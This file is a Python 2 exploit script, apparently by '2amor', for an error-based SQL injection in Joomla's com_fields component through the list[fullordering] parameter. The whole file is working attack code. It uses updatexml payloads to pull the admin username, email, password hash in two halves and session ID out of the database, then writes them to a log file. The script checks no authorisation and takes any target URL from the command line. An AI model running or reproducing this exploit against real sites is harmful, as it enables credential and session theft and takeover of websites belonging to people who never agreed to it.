# coding:utf-8
# #author:2amor
import threading
import time
import requests
import re
import sys


# 写入文件
def logfile(log, logfile):
    f = open(logfile, 'a+')
    f.write(log + "\n")
    f.close()


# 返回正常的url格式
def normalize_url(url, https=False):
    if not url:
        return
    elif url.startswith(('http://', 'https://')):
        return url
    if not https:
        url = 'http://' + url
    else:
        url = 'https://' + url
    return url


# 获取用户名，邮箱，密码，session


def get_info_by_joomla(url, param):
    if 'username' in param:
        payload = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,(select concat(username) from %23__users limit 1)),1)"
    elif 'email' in param:
        payload = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,(select concat(email) from %23__users limit 1)),1)"
    elif 'session_id' in param:
        payload = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,(select session_id from %23__session where username in (select username from %23__users))),1)"
    elif 'right_password' in param:
        payload = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,(select right(password,30) from %23__users limit 1)),1)"
    elif 'left_password' in param:
        payload = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,(select left(password,30) from %23__users limit 1)),1)"
    urlA = url + payload
    try:
        result = requests.get(urlA, timeout=10, allow_redirects=True, verify=False).content
        if "XPATH syntax error:" in result:
            pattern = re.compile("XPATH syntax error: &#039;(.*?)&#039")
            match_url = re.findall(pattern, result)
            if match_url:
                info = match_url[0]
            return info
    except:
        return 'no info!'
        pass


# 获取所有信息
def check_joomla(url):
    requests_url = normalize_url(url).strip()
    poc = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,user()),1)"
    urlA = requests_url + poc
    try:
        result = requests.get(urlA, timeout=10, allow_redirects=True, verify=False).content
        if 'XPATH syntax error:' in result:
            username = get_info_by_joomla(url, 'username')
            right_password = get_info_by_joomla(url, 'right_password')
            left_password = get_info_by_joomla(url, 'left_password')
            email = get_info_by_joomla(url, 'email')
            session_id = get_info_by_joomla(url, 'session_id')
            password = left_password + right_password
            vuls = '[+] vuls found! url: ' + url + ', admin: ' + username + ', password: ' + password + ', email: ' + email + ', session_id: ' + session_id
            logfile(vuls, 'joomla_vuls.txt')
            print vuls
        else:
            print '[!] no vuls! url: ' + url
    except Exception, e:
        print '[!] connection failed! url: ' + url


def main():
    if len(sys.argv) < 2:
        print('argument error')
        print('example: ' + sys.argv[0] + ' url')
        exit(0)  #
    target = sys.argv[1]
    #check_joomla('http://localhost/joomla')
    check_joomla(target)


if __name__ == '__main__':
    main()
